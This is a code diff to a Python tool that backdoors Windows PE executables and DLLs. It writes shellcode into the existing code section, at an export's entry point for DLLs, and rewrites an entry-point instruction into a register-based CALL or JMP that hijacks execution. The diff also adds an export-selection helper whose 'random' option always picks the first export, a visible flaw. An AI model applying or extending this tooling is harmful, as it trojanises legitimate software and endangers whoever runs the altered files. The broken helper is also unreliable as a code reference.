@@ -30,7 +30,7 @@ class PeBackdoor:
         self.backdoorOffsetRel: int = 0   # from start of the code section
     
 
-    def injectShellcode(self):
+    def injectShellcode(self, dllfunc=""):
         sect = self.superpe.get_code_section()
         if sect == None:
             logger.error('Could not find code section in input PE file!')
@@ -46,14 +46,14 @@ Code section size : {sect_size}
 ''')
 
         if self.superpe.is_dll():
-            offset = self.getExportEntryPoint("BZ2_blockSort")
-            logger.info("Inserting shellcode into DLL at 0x{:X} (sizes: sect {} shellcode {})".format(
-                offset, sect_size, len(self.shellcodeData)
+            offset = self.getExportEntryPoint(dllfunc)
+            logger.info("--[ Inserting shellcode into DLL at offset 0x{:X} (in {})".format(
+                offset, sect_name
             ))
         else:
             offset = int((sect_size - len(self.shellcodeData)) / 2)
-            logger.info("Inserting shellcode into EXE at 0x{:X} (sizes: sect {} shellcode {})".format(
-                offset, sect_size, len(self.shellcodeData)
+            logger.info("--[ Inserting shellcode into EXE at offset 0x{:X} (in {})".format(
+                offset, sect_name
             ))
 
         self.superpe.pe.set_bytes_at_offset(offset, self.shellcodeData)
@@ -74,7 +74,7 @@ Trailing {sect_name} bytes:
 {hexdump(self.superpe.pe.get_data(self.superpe.pe.get_rva_from_offset(p)), p, 64)}
 ''', '\t')
 
-        logger.info(f'Shellcode injected into existing code section at RVA 0x{rva:X}')
+        logger.info(f'---[ Shellcode injected into existing code section at RVA 0x{rva:X}')
         logger.debug(graph)
         return True
 
@@ -104,13 +104,13 @@ Trailing {sect_name} bytes:
         dec = lambda x: '???' if x is None else x.decode() 
 
         if len(exportName) == 0:
-            logger.critical('Export name not specified! Specify DLL Exported function name to hijack with -e/--export')
+            raise Exception('Export name not specified! Specify DLL Exported function name to hijack')
 
         d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
         self.superpe.pe.parse_data_directories(directories=d)
 
         if self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
-            logger.error('No DLL exports found! Specify existing DLL Exported function with -e/--export!')
+            logger.error('No DLL exports found! Specify existing DLL Exported function')
             return -1
         
         exports = [(e.ordinal, dec(e.name)) for e in self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols]
@@ -124,6 +124,25 @@ Trailing {sect_name} bytes:
                 return addr
 
         return -1
+
+
+    def getRandomExport(self, choose_random=False):
+        dec = lambda x: '???' if x is None else x.decode() 
+        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
+        self.superpe.pe.parse_data_directories(directories=d)
+
+        if self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
+            raise Exception('No DLL exports found! Specify existing DLL Exported function')
+        
+        exports = [(e.ordinal, dec(e.name)) for e in self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols]
+        export = exports[0]
+        if choose_random:
+            export = exports[0]
+
+        name = export[1]
+        addr = self.superpe.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]].address
+        logger.info(f'Using DLL Export "{name}" at RVA 0x{addr:X} . Attempting to hijack it...')
+        return name
     
 
     def backdoorEntryPoint(self, addr = -1):
@@ -203,7 +222,7 @@ Trailing {sect_name} bytes:
         found |= instr.mnemonic.lower() == 'call'
 
         if found:
-            logger.info(f'Backdooring entry point {instr.mnemonic.upper()} instruction at 0x{instr.address:X} into:')
+            logger.info(f'--[ Backdooring entry point {instr.mnemonic.upper()} instruction at RVA 0x{instr.address:X} into:')
 
             jump = random.choice([
                 f'CALL {reg}',
